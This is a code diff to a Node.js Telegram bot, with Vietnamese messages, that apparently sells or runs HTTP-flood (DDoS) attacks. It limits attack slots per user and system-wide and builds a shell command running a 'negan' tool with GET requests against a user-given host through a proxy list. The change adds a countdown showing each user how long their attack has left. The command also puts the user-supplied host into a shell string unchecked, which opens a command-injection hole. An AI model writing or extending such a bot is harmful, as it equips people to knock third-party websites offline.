@@ -62,7 +62,10 @@ bot.on('message', async (msg) => {
 
         // Kiểm tra số lệnh đang chạy của người dùng
         const userAttacks = Array.from(currentAttacks.values()).filter(attack => attack.user === chatId).length;
-        if (userAttacks >= maxSlot) return sendMarkdownMessage(chatId, '🚫 Bạn đang có một lệnh chạy. Vui lòng chờ tiến trình hiện tại hoàn tất.');
+        if (userAttacks >= maxSlot) {
+            const remainingTime = maxTimeAttacks - (Date.now() - currentAttacks.get(chatId).startTime) / 1000;
+            return sendMarkdownMessage(chatId, `🚫 Bạn đang có một lệnh chạy. Vui lòng chờ tiến trình hiện tại hoàn tất. Số giây còn lại: ${Math.ceil(remainingTime)} giây.`);
+        }
 
         // Kiểm tra số lệnh đang chạy toàn hệ thống
         if (currentAttacks.size >= maxConcurrentAttacks) {
@@ -71,7 +74,7 @@ bot.on('message', async (msg) => {
         }
 
         const command = `node ./negan -m GET -u ${host} -p live.txt --full true -s ${time}`;
-        currentAttacks.set(chatId, { user: chatId, command });
+        currentAttacks.set(chatId, { user: chatId, command, startTime: Date.now() });
         executeCommand(chatId, command, host, time, username);
         return;
     }
